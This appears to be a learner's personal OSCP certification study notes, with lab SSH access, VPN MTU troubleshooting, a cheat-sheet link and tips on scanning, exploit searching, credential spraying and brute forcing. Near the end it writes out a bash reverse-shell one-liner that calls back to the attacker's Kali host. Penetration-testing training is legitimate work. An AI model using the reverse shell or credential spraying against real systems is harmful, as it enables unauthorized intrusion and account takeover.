# 🎯 OSCP


```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```


[_Try Harder_](https://www.offsec.com/offsec/what-it-means-to-try-harder/) mindset. To better understand this mindset, let's quickly consider two potential perspectives in a moment of "failure."

1. If my attack or defense fails, it represents a truth about my current skills/processes/configurations/approach as much as it is a truth about the system.
2. If my attack or defense fails, this allows me to learn something new, change my approach, and do something differently.

Do exercise before or after study!

---------

**MOST IMP**

```
sudo ip l s dev tun0 mtu 1300
```

https://github.com/saisathvik1/oscp-cheatsheet
Best cheat sheet!

---

**Did I scan all ports? Did I search for exploits on every port?**

- When something requires you to create a script it's probably a rabbit hole
- The answer is infront of you just keep calm be cold blooded
- If you see something unusual (like redis port or nfs port) it is there for a reason
- Searchsploit everything, you might get surprised with what you find. (Including linux kernels too)
- After nmap scan results.. don't jump to start hunting for application/service exploit/poc. Read every line of output slowly. 🤞
- Time management is one of the most important thing about the oscp use your time wisely
- Be mobile ,you may separate your notes into smaller parts ,when you find creds spray them everywhere ,take notes of everything ,I strongly recommend you to take screenshots of every command you ran ,If you stuck just go take a walk or change your target
- cme is more useful than you think ,use cme modules to test vulnerabilities in AD chain ,It might tell you that there is another way to exploit ADDC

------

1. always check http and https both for same site
2. check local ports after getting initial shell
3. **payload all the things** have it ALL!
4. do brute force if nothing works
5. if SSH stuck, try to lower MTU and it will works `sudo ifconfig tun0 mtu 1200`
6. whenever you run exploit and
	- it gives error when you provide required field, then look at code because you need to change input to take as binary with help of `b(SNIP)`
	- if its **RCE** and still don't work then use ping first with exploit. Example, `ping -c 1 $tun0_IP` and if it works then start nc and take shell with `'/bin/bash -c "/bin/bash -i &> /dev/tp/kali_IP/443 0>&1"'`

Try https://unix.stackexchange.com/questions/722954/ssh-stuck-at-expecting-ssh2-msg-kex-ecdh-reply or https://serverfault.com/questions/210408/cannot-ssh-debug1-expecting-ssh2-msg-kex-dh-gex-reply